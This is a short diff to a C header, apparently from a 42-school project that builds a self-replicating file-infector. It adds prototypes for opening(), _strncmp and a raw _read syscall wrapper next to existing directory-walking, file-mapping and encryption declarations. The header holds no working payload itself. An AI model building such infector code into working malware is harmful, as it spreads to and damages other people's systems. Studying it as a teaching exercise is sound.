@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/03/26 11:51:09 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/03/26 17:59:33 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -32,7 +32,7 @@
 
 # define USER_ENTRY	2
 # define ROOT_ENTRY	4
-# define BUFF_SIZE	2048
+# define BUFF_SIZE	4096
 # define OFFSET		1461
 
 # define __INLINE__	__attribute__((always_inline)) inline
@@ -103,6 +103,7 @@ typedef struct	s_data
 /* Core */
 void			start(void);
 void			cypher_beg(t_data *data);
+void			opening(t_data *data);
 void			war(t_data *data);
 void			locate(t_data *data, t_directory *dir);
 void			inspect(t_data *data, char *path);
@@ -125,6 +126,7 @@ void			revert_two(t_key *key, char *ptr, size_t size);
 */
 void			*_memcpy(void *d, void *s, size_t size);
 void			*_memset(void *b, int c, size_t len);
+int				_strncmp(char *s1, char *s2, size_t n);
 size_t			_strlen(char *s);
 int				_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 int				_open(const char *path, int flags, mode_t mode);
@@ -132,6 +134,7 @@ int				_fstat(int fd, struct stat *statbuf);
 int				_close(int fd);
 void			*_mmap(void *addr, size_t len, int prot, size_t flags, size_t fd, off_t offset);
 int				_munmap(void *addr, size_t len);
+ssize_t			_read(int fd, void *buf, size_t len);
 int				_write(int fd, const void *buf, size_t len);
 int				_getuid(void);
 int				_random_number(int limit);
